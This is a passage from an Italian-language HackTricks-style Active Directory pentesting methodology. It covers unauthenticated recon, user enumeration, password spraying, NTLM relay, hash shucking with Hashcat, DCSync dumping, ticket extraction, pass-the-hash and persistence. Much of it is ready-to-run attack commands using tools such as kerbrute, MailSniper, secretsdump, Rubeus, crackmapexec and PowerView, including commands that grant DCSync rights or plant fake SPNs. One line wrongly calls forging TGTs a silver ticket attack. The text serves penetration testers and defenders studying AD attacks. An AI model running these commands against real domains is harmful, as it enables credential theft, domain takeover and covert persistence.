# Active Directory Metodologia

{{#include ../../banners/hacktricks-training.md}}

## Panoramica di base

**Active Directory** funge da tecnologia fondamentale, permettendo ai **network administrators** di creare e gestire in modo efficiente **domini**, **utenti** e **oggetti** all'interno di una rete. È progettata per scalare, facilitando l'organizzazione di un elevato numero di utenti in **gruppi** e **sottogruppi** gestibili, controllando i **diritti di accesso** a vari livelli.

La struttura di **Active Directory** è composta da tre livelli principali: **domini**, **tree**, e **forest**. Un **domain** comprende una raccolta di oggetti, come **utenti** o **dispositivi**, che condividono un database comune. I **tree** sono gruppi di domini collegati da una struttura condivisa, e una **forest** rappresenta la raccolta di più tree, interconnessi tramite **trust relationships**, formando il livello più alto della struttura organizzativa. A ciascuno di questi livelli possono essere assegnati diritti specifici di **accesso** e **comunicazione**.

Concetti chiave in **Active Directory** includono:

1. **Directory** – Contiene tutte le informazioni relative agli oggetti di Active Directory.
2. **Object** – Indica entità all'interno della directory, inclusi **utenti**, **gruppi** o **cartelle condivise**.
3. **Domain** – Funziona come contenitore per gli oggetti della directory; in una **forest** possono coesistere più domini, ognuno con la propria collezione di oggetti.
4. **Tree** – Raggruppamento di domini che condividono un dominio root comune.
5. **Forest** – Il livello più alto della struttura organizzativa in Active Directory, composto da diversi tree con **trust relationships** tra di loro.

**Active Directory Domain Services (AD DS)** comprende una serie di servizi critici per la gestione centralizzata e la comunicazione all'interno di una rete. Questi servizi includono:

1. **Domain Services** – Centralizza l'archiviazione dei dati e gestisce le interazioni tra **users** e **domains**, incluse funzionalità di **authentication** e di ricerca.
2. **Certificate Services** – Gestisce la creazione, distribuzione e amministrazione dei **certificati digitali**.
3. **Lightweight Directory Services** – Supporta applicazioni abilitate alla directory tramite il protocollo **LDAP**.
4. **Directory Federation Services** – Fornisce funzionalità di **single-sign-on** per autenticare gli utenti su più applicazioni web in una singola sessione.
5. **Rights Management** – Aiuta a proteggere materiale soggetto a copyright regolando la sua distribuzione e uso non autorizzati.
6. **DNS Service** – Cruciale per la risoluzione dei **domain names**.

Per una spiegazione più dettagliata consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Per imparare come attaccare l'AD devi comprendere molto bene il processo di **Kerberos authentication**.\
[**Leggi questa pagina se non sai ancora come funziona.**](kerberos-authentication.md)

## Cheat Sheet

Puoi dare un'occhiata rapida a [https://wadcoms.github.io/](https://wadcoms.github.io) per vedere velocemente quali comandi puoi eseguire per enumerare/sfruttare un AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** per eseguire azioni. Se provi ad accedere a una macchina tramite l'indirizzo IP, **verrà usato NTLM e non Kerberos**.

## Recon Active Directory (senza credenziali/sessioni)

Se hai solo accesso all'ambiente AD ma non possiedi credenziali/sessioni potresti:

- **Pentest the network:**
- Scansiona la rete, trova macchine e porte aperte e prova a **exploit vulnerabilities** o **estrarre credenziali** da esse (per esempio, [i printer possono essere target molto interessanti](ad-information-in-printers.md)).
- L'enumerazione del DNS può fornire informazioni su server chiave nel dominio come web, printer, share, vpn, media, ecc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dai un'occhiata alla guida generale [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) per trovare più informazioni su come fare questo.
- **Controlla l'accesso null e Guest sui servizi smb** (questo non funziona sulle versioni moderne di Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guida più dettagliata su come enumerare un server SMB può essere trovata qui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerare LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guida più dettagliata su come enumerare LDAP può essere trovata qui (presta **speciale attenzione all'accesso anonimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Avvelenare la rete**
- Raccogli credenziali impersonando servizi con Responder ([**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md))
- Accedi agli host abusando del [**relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Raccogli credenziali **esponendo** servizi UPnP falsi con evil-S [**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Estrai username/nominativi da documenti interni, social media, servizi (principalmente web) all'interno degli ambienti di dominio e anche da fonti pubblicamente disponibili.
- Se trovi i nomi completi dei dipendenti, puoi provare diverse convenzioni di username AD (**leggi questo**(https://activedirectorypro.com/active-directory-user-naming-convention/)). Le convenzioni più comuni sono: _NameSurname_, _Name.Surname_, _NamSur_ (3 lettere di ciascuno), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettere casuali e 3 numeri casuali_ (abc123).
- Strumenti:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumerazione utenti

- **Anonymous SMB/LDAP enum:** Consulta le pagine [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando viene richiesta una **username non valida** il server risponderà con il codice di errore Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permettendoci di determinare che la username è invalida. Le **username valide** produrranno o un **TGT in una AS-REP** oppure l'errore _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando che l'utente è tenuto a eseguire la pre-autenticazione.
- **No Authentication against MS-NRPC**: Utilizzando auth-level = 1 (No authentication) contro l'interfaccia MS-NRPC (Netlogon) sui domain controller. Il metodo chiama la funzione `DsrGetDcNameEx2` dopo il binding dell'interfaccia MS-NRPC per verificare se l'utente o il computer esiste senza alcuna credenziale. Lo strumento [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa questo tipo di enumerazione. La ricerca può essere trovata [qui](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se trovi uno di questi server nella rete puoi anche effettuare una **user enumeration** su di esso. Ad esempio, potresti usare lo strumento [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Puoi trovare elenchi di usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e in questo ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Tuttavia, dovresti avere il **nome delle persone che lavorano in azienda** dalla fase di recon che avresti dovuto eseguire prima. Con nome e cognome puoi usare lo script [**namemash.py**](https://gist.github.com/superkojiman/11076951) per generare potenziali username validi.

### Knowing one or several usernames

Ok, quindi sai di avere già uno username valido ma nessuna password... Prova:

- [**ASREPRoast**](asreproast.md): Se un utente **non ha** l'attributo _DONT_REQ_PREAUTH_ puoi **richiedere un AS_REP message** per quell'utente che conterrà alcuni dati cifrati da una derivazione della password dell'utente.
- [**Password Spraying**](password-spraying.md): Proviamo le **password più comuni** con ciascuno degli utenti scoperti, magari qualche utente usa una password debole (tieni presente la password policy!).
- Nota che puoi anche effettuare **Password Spraying** contro gli **OWA servers** per cercare di ottenere accesso alle caselle mail degli utenti.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Potresti riuscire a **ottenere** alcuni challenge **hashes** da crackare avvelenando alcuni protocolli della rete:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più email e una migliore comprensione della rete**. Potresti essere in grado di forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) per ottenere accesso all'ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** da signing, verifica comunque la postura di **LDAP**: `netexec ldap <dc>` evidenzia `(signing:None)` / weak channel binding. Un DC con SMB signing richiesto ma LDAP signing disabilitato rimane un target valido per **relay-to-LDAP** e abusi come **SPN-less RBCD**.

### Lato client: printer credential leaks → validazione massiva delle credenziali di dominio

- Le interfacce Printer/web a volte **embed masked admin passwords in HTML**. Visualizzare source/devtools può rivelare il testo in chiaro (es., `<input value="<password>">`), consentendo accesso Basic-auth ai repository di scansione/stampa.
- I print jobs recuperati possono contenere **plaintext onboarding docs** con password per singolo utente. Mantieni gli abbinamenti allineati durante i test:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Rubare credenziali NTLM

Se puoi **accedere ad altri PC o share** con l'**utente null o guest** potresti **posizionare file** (come un SCF file) che se in qualche modo vengono raggiunti **innescherebbero un'autenticazione NTLM contro di te** così da poter **rubare** la **challenge NTLM** per poi crackerarla:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tratta ogni NT hash che possiedi già come un candidato password per altri formati più lenti il cui materiale chiave è derivato direttamente dall'NT hash. Invece di brute-forzare lunghe passphrase in Kerberos RC4 tickets, NetNTLM challenges, o cached credentials, immetti gli NT hash nelle modalità NT-candidate di Hashcat e lascia che validi il riuso delle password senza mai conoscere il plaintext. Questo è particolarmente potente dopo una compromissione di dominio dove puoi raccogliere migliaia di NT hash correnti e storici.

Usa shucking quando:

- Hai un corpus NT da DCSync, SAM/SECURITY dumps, o credential vaults e devi testare il riuso in altri domini/foreste.
- Catturi materiale Kerberos basato su RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), risposte NetNTLM, o blob DCC/DCC2.
- Vuoi provare rapidamente il riuso per passphrase lunghe e non attaccabili e pivotare immediatamente tramite Pass-the-Hash.

La tecnica **non funziona** contro tipi di crittografia i cui key non sono l'NT hash (es., Kerberos etype 17/18 AES). Se un dominio impone solo AES, devi tornare alle modalità password regolari.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Le voci di history ampliano drasticamente il pool di candidati perché Microsoft può memorizzare fino a 24 hash precedenti per account. Per altri modi di raccogliere segreti NTDS vedi:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) estrae dati locali SAM/SECURITY e cached domain logons (DCC/DCC2). Deduplica e aggiungi quegli hash allo stesso file `nt_candidates.txt`.
- **Track metadata** – Conserva l'username/dominio che ha prodotto ogni hash (anche se la wordlist contiene solo esadecimale). Hash corrispondenti ti dicono immediatamente quale principal sta riusando una password appena Hashcat stampa il candidato vincente.
- Preferisci candidati dalla stessa forest o da una forest trusted; questo massimizza la possibilità di overlap quando shucki.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Note:

- NT-candidate inputs **devono rimanere raw 32-hex NT hashes**. Disabilita gli engine di regole (niente `-r`, niente modalità ibride) perché il mangling corrompe il materiale chiave del candidato.
- Queste modalità non sono necessariamente più veloci, ma lo spazio chiave NTLM (~30,000 MH/s su un M3 Max) è ~100× più rapido rispetto a Kerberos RC4 (~300 MH/s). Testare una lista NT curata è molto meno costoso che esplorare l'intero spazio password nel formato lento.
- Esegui sempre l'**ultima build di Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) perché le modalità 31500/31600/35300/35400 sono state rilasciate di recente.
- Attualmente non esiste una modalità NT per AS-REQ Pre-Auth, e gli etype AES (19600/19700) richiedono la password in chiaro perché le loro chiavi sono derivate via PBKDF2 da password UTF-16LE, non da raw NT hash.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriva la chiave RC4 da ogni candidato NT e valida il blob `$krb5tgs$23$...`. Una corrispondenza conferma che l'account di servizio usa uno degli NT hash che possiedi.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Puoi opzionalmente recuperare il plaintext più tardi con `hashcat -m 1000 <matched_hash> wordlists/` se necessario.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

Lo stesso workflow si applica a NetNTLM challenge-responses (`-m 27000/27100`) e DCC (`-m 31500`). Una volta identificata una corrispondenza puoi lanciare relay, SMB/WMI/WinRM PtH, o ri-crackare l'NT hash con mask/rules offline.

## Enumerating Active Directory WITH credentials/session

Per questa fase devi aver **compromesso le credenziali o una sessione di un account di dominio valido.** Se hai alcune credenziali valide o una shell come domain user, **dovresti ricordare che le opzioni viste prima sono ancora opzioni per compromettere altri utenti**.

Prima di iniziare l'enumerazione autenticata dovresti conoscere qual è il **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Aver compromesso un account è un **grande passo per iniziare a compromettere l'intero dominio**, perché potrai avviare l'**Active Directory Enumeration:**

Riguardo [**ASREPRoast**](asreproast.md) ora puoi trovare ogni possibile utente vulnerabile, e riguardo [**Password Spraying**](password-spraying.md) puoi ottenere una **lista di tutti gli username** e provare la password dell'account compromesso, password vuote e nuove password promettenti.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

È molto semplice ottenere tutti gli username del dominio da Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Su Linux, puoi usare: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Anche se questa sezione di Enumeration sembra breve, è la parte più importante di tutte. Accedi ai link (principalmente quelli di cmd, powershell, powerview e BloodHound), impara come enumerare un dominio e pratica finché non ti senti a tuo agio. Durante un assessment, questo sarà il momento chiave per trovare la strada verso DA o per decidere che non è possibile fare nulla.

### Kerberoast

Kerberoasting implica l'ottenimento di **TGS tickets** usati da servizi legati ad account utente e il cracking della loro crittografia—che è basata sulle password utente—**offline**.

More about this in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Una volta ottenute delle credenziali puoi verificare se hai accesso a qualche **macchina**. A tal fine, potresti usare **CrackMapExec** per tentare connessioni su più server con protocolli diversi, in base alle tue scansioni di porte.

### Local Privilege Escalation

Se hai compromesso credenziali o una sessione come user di dominio e hai **accesso** con questo user a **qualsiasi macchina nel dominio** dovresti provare a trovare un modo per **escalare privilegi localmente e saccheggiare credenziali**. Questo perché solo con privilegi da amministratore locale potrai **dumpare gli hash di altri utenti** in memoria (LSASS) e localmente (SAM).

C'è una pagina completa in questo libro su [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e una [**checklist**](../checklist-windows-privilege-escalation.md). Inoltre, non dimenticare di usare [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

È molto **improbabile** che tu trovi **ticket** nell'utente corrente che **ti diano permessi per accedere** a risorse inaspettate, ma puoi comunque controllare:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se sei riuscito a enumerare l'active directory avrai **più indirizzi email e una migliore comprensione della rete**. Potresti riuscire a forzare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Cerca Creds nelle condivisioni dei computer | SMB Shares

Ora che hai alcune credenziali di base dovresti verificare se puoi **trovare** file **interessanti condivisi all'interno dell'AD**. Puoi farlo manualmente ma è un compito molto noioso e ripetitivo (e ancora di più se trovi centinaia di documenti da controllare).

[**Segui questo link per scoprire gli strumenti che puoi usare.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se puoi **accedere ad altri PC o condivisioni** potresti **posizionare file** (come un file SCF) che, se in qualche modo vengono aperti, innescheranno una **autenticazione NTLM verso di te** così potrai **rubare** la **NTLM challenge** per crackarla:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Questa vulnerabilità permetteva a qualsiasi utente autenticato di **compromettere il domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Per le tecniche seguenti un utente di dominio normale non è sufficiente, sono necessari privilegi/credenziali speciali per eseguire questi attacchi.**

### Hash extraction

Speriamo tu sia riuscito a **compromettere qualche account local admin** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Then, its time to dump all the hashes in memory and locally.\
[**Leggi questa pagina sui diversi modi per ottenere gli hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una volta che hai l'hash di un utente**, puoi usarlo per **impersonarlo**.\
Devi usare qualche **tool** che **esegua** l'**autenticazione NTLM usando** quell'**hash**, **oppure** potresti creare un nuovo **sessionlogon** e **iniettare** quell'**hash** dentro il **LSASS**, così quando viene eseguita un'**autenticazione NTLM**, quell'**hash** verrà utilizzato. L'ultima opzione è ciò che fa mimikatz.\
[**Leggi questa pagina per più informazioni.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

This attack aims to **use the user NTLM hash to request Kerberos tickets**, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially **useful in networks where NTLM protocol is disabled** and only **Kerberos is allowed** as authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** instead of their password or hash values. This stolen ticket is then used to **impersonate the user**, gaining unauthorized access to resources and services within a network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se hai l'**hash** o la **password** di un **local administrator** dovresti provare a effettuare il **login locale** su altri **PC** con queste credenziali.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Nota che questo è piuttosto **rumoroso** e **LAPS** lo **mitigherebbe**.

### MSSQL Abuse & Trusted Links

Se un utente ha privilegi per **access MSSQL instances**, potrebbe utilizzarlo per **execute commands** sull'host MSSQL (se in esecuzione come SA), **steal** l'NetNTLM **hash** o perfino effettuare un **relay** **attack**.\
Inoltre, se un'istanza MSSQL è trusted (database link) da una diversa istanza MSSQL, se l'utente ha privilegi sul database trusted, potrà **use the trust relationship to execute queries also in the other instance**. Queste trust possono essere concatenate e a un certo punto l'utente potrebbe trovare un database mal configurato dove può eseguire comandi.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite di inventory e deployment di terze parti spesso espongono percorsi potenti verso credenziali ed esecuzione di codice. Vedi:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se trovi un oggetto Computer con l'attributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e hai privilegi di dominio sulla macchina, sarai in grado di dumpare TGTs dalla memoria di ogni utente che effettua il login sulla macchina.\
Quindi, se un **Domain Admin logins onto the computer**, potrai dumpare il suo TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Grazie alla constrained delegation potresti perfino **automatically compromise a Print Server** (speriamo sia un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se a un utente o a un computer è consentita la "Constrained Delegation" sarà in grado di **impersonate any user to access some services in a computer**.\
Quindi, se **compromise the hash** di questo utente/computer sarai in grado di **impersonate any user** (anche domain admins) per accedere ad alcuni servizi.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avere il privilegio **WRITE** su un oggetto Active Directory di un computer remoto permette di ottenere l'esecuzione di codice con **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utente compromesso potrebbe avere alcuni **interesting privileges over some domain objects** che potrebbero permetterti di **move** lateralmente/**escalate** privilegi.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Scoprire un **Spool service listening** all'interno del dominio può essere **abused** per **acquire new credentials** e **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Se **other users** **access** la macchina **compromessa**, è possibile **gather credentials from memory** e perfino **inject beacons in their processes** per impersonarli.\
Di solito gli utenti accedono al sistema via RDP, quindi qui trovi come effettuare un paio di attacchi su sessioni RDP di terze parti:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornisce un sistema per gestire la **local Administrator password** sui computer joined al dominio, garantendo che sia **randomized**, unica e frequentemente **changed**. Queste password sono memorizzate in Active Directory e l'accesso è controllato tramite ACLs agli utenti autorizzati. Con permessi sufficienti per accedere a queste password, è possibile pivotare su altri computer.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** dalla macchina compromessa potrebbe essere un modo per escalare privilegi dentro l'ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se sono configurati **vulnerable templates** è possibile abusarne per escalare privilegi:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Una volta ottenuti privilegi di **Domain Admin** o ancora meglio **Enterprise Admin**, puoi **dump** il **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Alcune delle tecniche discusse prima possono essere usate per persistence.\
Ad esempio potresti:

- Rendere gli utenti vulnerabili a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Rendere gli utenti vulnerabili a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Concedere privilegi [**DCSync**](#dcsync) a un utente

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

L'**Silver Ticket attack** crea un **legittimo Ticket Granting Service (TGS) ticket** per un servizio specifico usando l'**NTLM hash** (per esempio, l'**hash of the PC account**). Questo metodo è impiegato per **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** coinvolge un attaccante che ottiene l'**NTLM hash of the krbtgt account** in un ambiente Active Directory (AD). Questo account è speciale perché viene usato per firmare tutti i **Ticket Granting Tickets (TGTs)**, essenziali per l'autenticazione nella rete AD.

Una volta che l'attaccante ottiene questo hash, può creare **TGTs** per qualsiasi account scelga (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Questi sono come i golden tickets forgiati in modo da **bypass common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** è un ottimo modo per persistere nell'account di un utente (anche se cambia la password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates è anche possibile persistere con high privileges all'interno del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

